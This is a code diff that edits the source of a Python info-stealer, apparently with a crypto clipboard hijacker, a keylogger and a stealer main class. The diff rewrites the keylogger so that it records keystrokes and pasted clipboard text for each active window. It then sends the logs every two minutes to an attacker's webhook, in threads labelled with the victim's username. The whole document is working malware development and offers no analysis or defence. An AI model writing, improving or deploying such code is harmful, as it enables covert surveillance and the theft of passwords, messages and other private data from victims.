@@ -422,17 +422,13 @@ class CryptoClipper:
 
 class Keylogger:
     def __init__(self):
-        self.log = ""
+        self.logs = {}
         self.interval = 120
         self.special_thread_id = None
-        
-        # State tracking
         self.caps_on = False
         self.shift_on = False
         self.ctrl_on = False
-        self.last_window = ""
-        
-        # TR Mapping
+        self.current_window = "Unknown"
         self.tr_map_upper = {
             'i': 'İ', 'ı': 'I', 'ğ': 'Ğ', 'ü': 'Ü', 'ş': 'Ş', 'ö': 'Ö', 'ç': 'Ç'
         }
@@ -444,56 +440,53 @@ class Keylogger:
             length = user32.GetWindowTextLengthW(hwnd)
             buff = ctypes.create_unicode_buffer(length + 1)
             user32.GetWindowTextW(hwnd, buff, length + 1)
-            return buff.value
+            return buff.value.replace("*", "").strip()
         except: return "Unknown"
     
     def on_press(self, key):
         try: 
-            # Window Title Tracking
-            curr = self.get_active_window()
-            if curr != self.last_window:
-                self.log += f"\n\n--- [{curr}] ---\n"
-                self.last_window = curr
+            self.current_window = self.get_active_window()
+            if self.current_window not in self.logs:
+                self.logs[self.current_window] = ""
             
-            # Ctrl Combinations (Filter & Clipboard)
             if self.ctrl_on:
                 if hasattr(key, 'char') and key.char:
                     k = key.char.lower()
                     if k == 'v':
                         try:
                             paste = pyperclip.paste()
-                            if paste: self.log += f" [PASTE: {paste}] "
+                            if paste: self.logs[self.current_window] += f" [PASTE: {paste}] "
                         except: pass
                     elif k == 'c':
-                         self.log += " [COPY] "
+                         self.logs[self.current_window] += " [COPY] "
                     elif k == 'x':
-                         self.log += " [CUT] "
+                         self.logs[self.current_window] += " [CUT] "
                 return
 
             ch = key.char
             if ch is None:
                 return
 
-            # Caps/Shift Logic
             if ch.isalpha():
                 is_upper = self.caps_on ^ self.shift_on
                 if is_upper:
-                    # Apply TR mapping if needed, else standard upper
                     ch = self.tr_map_upper.get(ch, ch.upper())
                 else:
                     ch = ch.lower()
 
-            self.log += ch
+            self.logs[self.current_window] += ch
 
         except AttributeError:
-            start_import_keyboard() # Ensure keyboard is loaded if needed locally, though likely global
+            if self.current_window not in self.logs:
+                self.logs[self.current_window] = ""
+                
             if key == keyboard.Key.space:
-                self.log += " "
+                self.logs[self.current_window] += " "
             elif key == keyboard.Key.enter:
-                self.log += "\n"
+                self.logs[self.current_window] += "\n"
             elif key == keyboard.Key.backspace:
-                if len(self.log) > 0:
-                     self.log = self.log[:-1]
+                if len(self.logs[self.current_window]) > 0:
+                     self.logs[self.current_window] = self.logs[self.current_window][:-1]
             elif key == keyboard.Key.caps_lock:
                 self.caps_on = not self.caps_on
             elif key in (keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r):
@@ -521,56 +514,45 @@ class Keylogger:
 
         try:
             user = os.getenv("USERNAME", "Unknown")
-            name = f"victim-{user}-keylog"
-            payload = {"content": f"Keylogger Started for {user}", "thread_name": name}
+            payload = {"content": f"Keylogger Started for {user}", "thread_name": f"⌨️victim-{user}-keylog"}
             async with aiohttp.ClientSession() as session:
                 async with session.post(webhook + "?wait=true", json=payload) as resp:
                      if resp.status in (200, 201, 204):
                          d = await resp.json()
-                         self.special_thread_id = d.get("channel_id")
+                         self.special_thread_id = d.get("id") or d.get("channel_id")
                          if self.special_thread_id:
-                             try:
-                                 if not os.path.exists(storage_dir): os.makedirs(storage_dir, exist_ok=True)
-                                 with open(thread_file, "w") as f: f.write(str(self.special_thread_id))
-                             except: pass
+                             if not os.path.exists(storage_dir): os.makedirs(storage_dir, exist_ok=True)
+                             with open(thread_file, "w") as f: f.write(str(self.special_thread_id))
         except: pass
 
     async def report_loop(self):
         while True:
             await asyncio.sleep(self.interval)
-            if self.log:
-                tmp = self.log
-                self.log = ""
-                # Chunk splitting if too large could be good, but for now simple
-                if len(tmp) > 1900:
-                    chunks = [tmp[i:i+1900] for i in range(0, len(tmp), 1900)]
-                    for chunk in chunks:
-                         payload = {"content": f"```\n{chunk}\n```"}
-                         async with aiohttp.ClientSession() as session:
-                             await SendWebhook(session, webhook, json=payload, thread_id=self.special_thread_id, headers={"Content-Type": "application/json"})
-                else:
-                    payload = {"content": f"```\n{tmp}\n```"}
-                    async with aiohttp.ClientSession() as session:
-                         await SendWebhook(session, webhook, json=payload, thread_id=self.special_thread_id, headers={"Content-Type": "application/json"})
+            if self.logs:
+                full_report = ""
+                for window, content in self.logs.items():
+                    if content:
+                        full_report += f"\n\n--- [{window}] ---\n{content}"
+                
+                self.logs = {}
+                
+                if full_report:
+                    if len(full_report) > 1900:
+                        chunks = [full_report[i:i+1900] for i in range(0, len(full_report), 1900)]
+                        async with aiohttp.ClientSession() as session:
+                            for chunk in chunks:
+                                 await SendWebhook(session, webhook, json={"content": f"```\n{chunk}\n```"}, thread_id=self.special_thread_id)
+                    else:
+                        async with aiohttp.ClientSession() as session:
+                             await SendWebhook(session, webhook, json={"content": f"```\n{full_report}\n```"}, thread_id=self.special_thread_id)
 
     async def Start(self):
         await self.get_thread_id()
         try:
-            global keyboard
-            from pynput import keyboard
-            # We defined start_import_keyboard helper just in case, but global import here works for the class instance usage
             l = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
             l.start()
             await self.report_loop()
-        except Exception as e: 
-            print(e)
-
-def start_import_keyboard():
-    global keyboard
-    try:
-        from pynput import keyboard
-    except: pass
-
+        except: pass
 class Main:
     def __init__(self) -> None:
         self.profiles_full_path = list()
@@ -615,7 +597,7 @@ class Main:
                 comp = os.getenv("COMPUTERNAME", "Unknown")
             except: comp = "Unknown"
             
-            name = f"Victim - {user}"
+            name = f"🩸 Victim - {user}"
 
             payload = {
                 "content": f"Started Stealer for {user}@{comp}",
